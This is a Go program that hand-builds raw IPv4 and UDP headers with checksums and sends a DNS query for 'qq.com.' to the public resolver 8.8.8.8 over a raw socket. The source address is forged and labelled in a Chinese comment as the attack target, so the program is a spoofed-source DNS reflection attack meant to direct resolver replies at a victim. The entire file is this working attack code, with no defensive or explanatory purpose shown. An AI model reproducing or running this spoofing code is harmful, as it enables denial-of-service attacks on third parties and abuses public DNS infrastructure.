package main

import (
	"encoding/binary"
	"github.com/miekg/dns"
	"golang.org/x/net/ipv4"
	"log"
	"net"
)

func main() {
	buff := NewMsg()
	dst := net.IPv4(8, 8, 8, 8)
	src := net.IPv4(192, 168, 199, 126)
	iph := &ipv4.Header{
		Version:  ipv4.Version,
		Len:      ipv4.HeaderLen,
		TOS:      0x00,
		TotalLen: ipv4.HeaderLen + len(buff),
		TTL:      64,
		Flags:    ipv4.DontFragment,
		FragOff:  0,
		Protocol: 17,
		Checksum: 0,
		Src:      src, // 攻击目标
		Dst:      dst, // 目标DNS
	}

	h, err := iph.Marshal()
	if err != nil {
		log.Fatal(err)
	}
	iph.Checksum = int(checkSum(h))
	//填充udp首部
	//udp伪首部
	pudph := PseudoHeader{
		SrcIP:  src,
		DstIP:  dst,
		Zero:   0,
		Proto:  17,
		Length: uint16(len(buff)) + 8,
	}

	udph := UDPHeader{
		SPort:    10000,
		DPort:    53,
		Length:   uint16(len(buff)) + 8,
		CheckSum: 0,
	}
	pudph.UDPHeader = udph
	udphb := pudph.Bytes()
	check := checkSum(append(udphb, buff...))
	binary.BigEndian.PutUint16(udphb[18:], check)
	laddr, err := net.ResolveIPAddr("ip4", "0.0.0.0")
	if err != nil {
		log.Println(err)
		return
	}

	c, err := net.ListenIP("ip4:udp", laddr)

	if err != nil {
		log.Println(err)
		return
	}

	conn, err := ipv4.NewRawConn(c)
	if err != nil {
		log.Println(err)
		return
	}

	err = conn.WriteTo(iph, append(udphb[12:20], buff...), nil)
	if err != nil {
		log.Println(err)
	}
}

func checkSum(msg []byte) uint16 {
	var (
		sum    uint32
		length int = len(msg)
		index  int
	)

	for length > 1 {
		sum += uint32(msg[index])<<8 + uint32(msg[index+1])
		index += 2
		length -= 2
	}
	if length > 0 {
		sum += uint32(msg[index]) << 8
	}
	sum += (sum >> 16)
	return uint16(^sum)
}

func NewMsg() []byte {
	msg := new(dns.Msg)
	msg.Id = dns.Id()
	msg.RecursionDesired = true
	msg.Question = make([]dns.Question, 1)
	msg.Question[0] = dns.Question{
		Qtype:  dns.TypeA,
		Qclass: dns.ClassINET,
		Name:   "qq.com.",
	}
	b, err := msg.Pack()
	if err != nil {
		log.Fatal(err)
	}
	return b
}

type PseudoHeader struct {
	SrcIP  net.IP
	DstIP  net.IP
	Zero   byte
	Proto  byte
	Length uint16
	UDPHeader
}

func (p PseudoHeader) Bytes() []byte {
	var b = make([]byte, 20)
	b[0], b[1], b[2], b[3] = p.SrcIP[12], p.SrcIP[13], p.SrcIP[14], p.SrcIP[15]
	b[4], b[5], b[6], b[7] = p.DstIP[12], p.DstIP[13], p.DstIP[14], p.DstIP[15]
	b[8] = p.Zero
	b[9] = p.Proto
	binary.BigEndian.PutUint16(b[10:12], p.Length)
	binary.BigEndian.PutUint16(b[12:], p.SPort)
	binary.BigEndian.PutUint16(b[14:], p.DPort)
	binary.BigEndian.PutUint16(b[16:], p.Length)
	binary.BigEndian.PutUint16(b[18:], p.CheckSum)
	return b
}

type UDPHeader struct {
	SPort    uint16
	DPort    uint16
	Length   uint16
	CheckSum uint16
}

func (p UDPHeader) Bytes() []byte {
	var b = make([]byte, 8)
	binary.BigEndian.PutUint16(b[:2], p.SPort)
	binary.BigEndian.PutUint16(b[2:4], p.DPort)
	binary.BigEndian.PutUint16(b[4:6], p.Length)
	binary.BigEndian.PutUint16(b[6:8], p.CheckSum)
	return b
}
